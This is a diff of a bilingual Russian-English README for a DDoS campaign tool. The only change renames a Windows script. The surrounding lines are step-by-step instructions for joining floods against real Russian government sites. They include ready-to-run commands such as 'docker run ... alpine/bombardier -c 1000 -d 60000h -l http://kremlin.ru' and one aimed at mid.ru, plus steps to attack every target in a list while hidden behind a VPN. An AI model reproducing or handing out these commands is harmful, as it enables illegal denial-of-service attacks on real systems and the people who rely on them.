@@ -38,7 +38,7 @@ For a lot of resources or closed for Ukraine so please use Cloud way if cloud un
     - SurfShark: https://surfshark.com/ (paid)
     - Clear VPN: https://clearvpn.com/ (free)
     - Nord VPN: https://nordvpn.com/ (paid)
-5. Запустить все цели из `resources.txt` для Windows в проводнике открываем `run_windows.bat` для Linux/Mac `./run_all_docker.sh` для целей из `resources.txt` (или `./run_all_docker.sh файл-с-целями`)
+5. Запустить все цели из `resources.txt` для Windows в проводнике открываем `run_all_windows.bat` для Linux/Mac `./run_all_docker.sh` для целей из `resources.txt` (или `./run_all_docker.sh файл-с-целями`)
 6. Для выполнения с конкретными целями - Скопировать скрипт (например `docker run -d --rm alpine/bombardier -c 1000 -d 60000h -l http://kremlin.ru`) и нажать энтер
 7. Убедиться, что процесс пошёл
 8. Ждать падения рашки
@@ -55,7 +55,7 @@ For a lot of resources or closed for Ukraine so please use Cloud way if cloud un
     - Clear VPN: https://clearvpn.com/ (free)
     - Nord VPN: https://nordvpn.com/ (paid)
 5. Use Windows Command Prompt or the Mac/Linux Terminal and launch as an admin.
-6. Attack all targets from resources.txt for Windows - `run_windows.bat` for Linux/Mac `./run_all_docker.sh ` for `resources.txt` (or `./run_all_docker.sh your_aim_file`)
+6. Attack all targets from resources.txt for Windows - `run_all_windows.bat` for Linux/Mac `./run_all_docker.sh ` for `resources.txt` (or `./run_all_docker.sh your_aim_file`)
 7. If you want select aims manually: `docker run -d --rm alpine/bombardier -c 1000 -d 60000h -l https://mid.ru` 
    (Open as many separate CMD consoles as many instances you are going to launch (each line – one script))
 8. Make sure that the process started
@@ -74,4 +74,4 @@ For a lot of resources or closed for Ukraine so please use Cloud way if cloud un
 
 ### there are a lot of scripts for local usage
 for unix  https://github.com/dotiful/bombardier/blob/main/run_all_docker.sh
-for winodws https://github.com/dotiful/bombardier/blob/main/run_windows.bat
+for winodws https://github.com/dotiful/bombardier/blob/main/run_all_windows.bat
